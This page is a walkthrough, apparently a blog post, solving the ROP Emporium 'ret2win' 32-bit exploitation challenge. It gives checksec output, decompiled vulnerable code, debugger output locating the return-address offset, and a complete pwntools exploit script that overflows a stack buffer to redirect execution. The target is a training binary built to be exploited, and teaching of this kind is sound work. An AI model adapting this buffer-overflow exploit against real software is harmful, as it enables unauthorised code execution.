I"‹'<h3 id="checksec">Checksec</h3>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Canary                        : No
NX                            : Yes
PIE                           : No
Fortify                       : No
RelRO                         : Partial
</code></pre></div></div>

<h3 id="check-main-function">Check main function</h3>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">undefined4</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"ret2win by ROP Emporium"</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"32bits</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="n">pwnme</span><span class="p">();</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Exiting"</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="check-vuln-function">Check vuln function</h3>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">pwnme</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">local_2c</span> <span class="p">[</span><span class="mi">40</span><span class="p">];</span>
  
  <span class="n">memset</span><span class="p">(</span><span class="n">local_2c</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x20</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span>
      <span class="s">"For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stackbuffer;</span><span class="se">\n</span><span class="s">What could possibly go wrong?"</span>
      <span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span>
      <span class="s">"You there madam, may I have your input please? And don</span><span class="se">\'</span><span class="s">t worry about null bytes, we</span><span class="se">\'</span><span class="s">reusing fgets!</span><span class="se">\n</span><span class="s">"</span>
      <span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">);</span>
  <span class="n">fgets</span><span class="p">(</span><span class="n">local_2c</span><span class="p">,</span><span class="mh">0x32</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
  <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="check-win-function">Check win function</h3>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gefâž¤  disassemble ret2win 
Dump of assembler code for function ret2win:
   0x08048659 &lt;+0&gt;:     push   ebp
   0x0804865a &lt;+1&gt;:     mov    ebp,esp
   0x0804865c &lt;+3&gt;:     sub    esp,0x8
   0x0804865f &lt;+6&gt;:     sub    esp,0xc
   0x08048662 &lt;+9&gt;:     push   0x8048824
   0x08048667 &lt;+14&gt;:    call   0x8048400 &lt;printf@plt&gt;
   0x0804866c &lt;+19&gt;:    add    esp,0x10
   0x0804866f &lt;+22&gt;:    sub    esp,0xc
   0x08048672 &lt;+25&gt;:    push   0x8048841
   0x08048677 &lt;+30&gt;:    call   0x8048430 &lt;system@plt&gt;
   0x0804867c &lt;+35&gt;:    add    esp,0x10
   0x0804867f &lt;+38&gt;:    nop
   0x08048680 &lt;+39&gt;:    leave  
   0x08048681 &lt;+40&gt;:    ret    
End of assembler dump.
</code></pre></div></div>

<h3 id="intial">Intial</h3>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gefâž¤  pattern create 100
[+] Generating a pattern of 100 bytes
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
[+] Saved as '$_gef0'
</code></pre></div></div>

<h3 id="check-registers-eip">Check registers (EIP)</h3>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$eax   : 0xffffcc40  â†’  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaam"
$ebx   : 0x0       
$ecx   : 0xffffcc40  â†’  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaam"
$edx   : 0xf7f9789c  â†’  0x00000000
$esp   : 0xffffcc70  â†’  0xf7fe006d  â†’  0x80002674 ("t&amp;"?)
$ebp   : 0x6161616b ("kaaa"?)
$esi   : 0xf7f96000  â†’  0x001d7d6c ("l}"?)
$edi   : 0x0       
$eip   : 0x6161616c ("laaa"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
</code></pre></div></div>

<h3 id="check-length-buffer-to-overflow-return-function">Check length buffer to overflow return function</h3>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gefâž¤  pattern search laaa
[+] Searching 'laaa'
[+] Found at offset 41 (little-endian search) likely
[+] Found at offset 44 (big-endian search)
</code></pre></div></div>

<h3 id="payload">Payload</h3>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ret2win32
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># Set up pwntools for the correct architecture
</span><span class="n">exe</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'ret2win32'</span><span class="p">)</span>

<span class="c1"># Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s">'''Start the exploit against the target.'''</span>
    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>

<span class="c1"># Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
</span><span class="n">gdbscript</span> <span class="o">=</span> <span class="s">'''
break *0x{exe.symbols.main:x}
continue
'''</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s">'</span><span class="se">\x90</span><span class="s">'</span> <span class="o">*</span> <span class="n">cyclic_find</span><span class="p">(</span><span class="s">'laaa'</span><span class="p">)</span>

<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">exe</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="s">'ret2win'</span><span class="p">,</span> <span class="p">[])</span>

<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="n">rop</span><span class="o">.</span><span class="n">__str__</span><span class="p">())</span>
<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>
:ET